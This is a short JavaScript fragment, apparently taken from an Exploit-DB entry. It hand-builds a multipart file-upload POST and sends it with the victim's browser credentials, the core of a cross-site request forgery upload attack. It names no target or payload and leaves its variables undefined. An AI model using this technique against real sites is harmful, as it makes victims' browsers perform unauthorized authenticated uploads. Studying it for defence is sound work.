// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
